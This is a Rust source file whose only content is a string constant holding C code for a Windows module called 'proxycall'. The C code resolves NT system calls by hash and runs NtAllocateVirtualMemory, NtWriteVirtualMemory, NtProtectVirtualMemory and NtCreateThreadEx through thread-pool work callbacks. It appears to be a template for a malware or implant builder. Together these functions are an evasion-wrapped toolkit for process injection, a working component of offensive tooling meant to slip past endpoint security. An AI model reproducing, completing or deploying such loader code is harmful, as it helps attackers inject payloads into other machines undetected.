pub const PROXYCALL_C: &str = r#"#include "proxycall.h"
#include "macros.h"
#include "winapi.h"
#include <windows.h>

extern NT_API g_NT_API;
extern NT_CONFIG g_NT_CONFIG;

void ConfigureCallBack(PTP_WORK_CALLBACK CallBack, PVOID args) {

    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)g_NT_API.TpAllocWork.pSyscallAddress)(
        &WorkReturn, (PTP_WORK_CALLBACK)CallBack, args, NULL);
    ((TPPOSTWORK)g_NT_API.TpPostWork.pSyscallAddress)(WorkReturn);
    ((TPRELEASEWORK)g_NT_API.TpReleaseWork.pSyscallAddress)(WorkReturn);
    WaitForSingleObject(NtCurrentProcess(), 0x1000);
}

void PCNtAllocateVirtualMemory(HANDLE hProcess, PVOID *address, SIZE_T zeroBits,
                               PSIZE_T size, ULONG allocationType,
                               ULONG permissions) {
    if (!g_NT_API.NtAllocateVirtualMemory.pSyscallAddress)
        InitNtSyscall(&g_NT_CONFIG, NtAllocateVirtualMemory_Hash,
                      S_PTR(NT_SYSCALL, g_NT_API.NtAllocateVirtualMemory));
    PTP_WORK WorkReturn = NULL;
    NTALLOCATEVIRTUALMEMORY_ARGS args = {0};
    args.hProcess = hProcess;
    args.address = address;
    args.zeroBits = zeroBits;
    args.size = size;
    args.allocationType = allocationType;
    args.permissions = permissions;
    args.ssn = g_NT_API.NtAllocateVirtualMemory.dwSsn;

    ConfigureCallBack((PTP_WORK_CALLBACK)CBNtAllocateVirtualMemory,
                      (PVOID)&args);
}

void PCNtWriteVirtualMemory(HANDLE hProcess, PVOID address, PVOID buffer,
                            ULONG numberOfBytesToWrite,
                            PULONG numberOfBytesWritten) {
    if (!g_NT_API.NtWriteVirtualMemory.pSyscallAddress)
        InitNtSyscall(&g_NT_CONFIG, NtWriteVirtualMemory_Hash,
                      S_PTR(NT_SYSCALL, g_NT_API.NtWriteVirtualMemory));
    PTP_WORK WorkReturn = NULL;
    NTWRITEVIRTUALMEMORY_ARGS args = {0};
    args.hProcess = hProcess;
    args.address = address;
    args.buffer = buffer;
    args.numberOfBytesToWrite = numberOfBytesToWrite;
    args.numberOfBytesWritten = numberOfBytesWritten;
    args.ssn = g_NT_API.NtWriteVirtualMemory.dwSsn;
#ifdef DEBUG
    PRINTA("[DEBUG] Write args hProcess: %d\n", args.hProcess);
    PRINTA("[DEBUG] Write args address: %p\n", args.address);
    PRINTA("[DEBUG] Write args buffer: %p\n", args.buffer);
    PRINTA("[DEBUG] Write args toWrite: %d\n", args.numberOfBytesToWrite);
    PRINTA("[DEBUG] Write args Written: %p\n", args.numberOfBytesWritten);
#endif
    ConfigureCallBack((PTP_WORK_CALLBACK)CBNtWriteVirtualMemory, (PVOID)&args);
}

void PCNtProtectVirtualMemory(HANDLE hProcess, PVOID *address, PULONG size,
                              ULONG permissions, PULONG old_permissions) {
    if (!g_NT_API.NtProtectVirtualMemory.pSyscallAddress)
        InitNtSyscall(&g_NT_CONFIG, NtProtectVirtualMemory_Hash,
                      S_PTR(NT_SYSCALL, g_NT_API.NtProtectVirtualMemory));
    PTP_WORK WorkReturn = NULL;
    NTPROTECTVIRTUALMEMORY_ARGS args = {0};
    args.hProcess = hProcess;
    args.address = address;
    args.size = size;
    args.permissions = permissions;
    args.old_permissions = old_permissions;
    args.ssn = g_NT_API.NtProtectVirtualMemory.dwSsn;

    ConfigureCallBack((PTP_WORK_CALLBACK)CBNtProtectVirtualMemory,
                      (PVOID)&args);
}

void PCNtCreateThreadEx(PHANDLE threadHandle, ACCESS_MASK desiredAccess,
                        PVOID objectAttributes, HANDLE processHandle,
                        PVOID lpStartAddress, PVOID lpParameter, ULONG flags,
                        SIZE_T stackZeroBits, SIZE_T sizeOfStackCommit,
                        SIZE_T sizeOfStackReserve, PVOID lpBytesBuffer) {
    if (!g_NT_API.NtCreateThreadEx.pSyscallAddress)
        InitNtSyscall(&g_NT_CONFIG, NtCreateThreadEx_Hash,
                      S_PTR(NT_SYSCALL, g_NT_API.NtCreateThreadEx));
    PTP_WORK WorkReturn = NULL;
    NTCREATETHREADEX_ARGS args = {0};
    args.threadHandle = threadHandle;
    args.desiredAccess = desiredAccess;
    args.objectAttributes = objectAttributes;
    args.processHandle = processHandle;
    args.lpStartAddress = lpStartAddress;
    args.lpParameter = lpParameter;
    args.flags = flags;
    args.stackZeroBits = stackZeroBits;
    args.sizeOfStackCommit = sizeOfStackCommit;
    args.sizeOfStackReserve = sizeOfStackReserve;
    args.lpBytesBuffer = lpBytesBuffer;
    args.ssn = g_NT_API.NtCreateThreadEx.dwSsn;

    ConfigureCallBack((PTP_WORK_CALLBACK)CBNtCreateThreadEx, (PVOID)&args);
}

"#;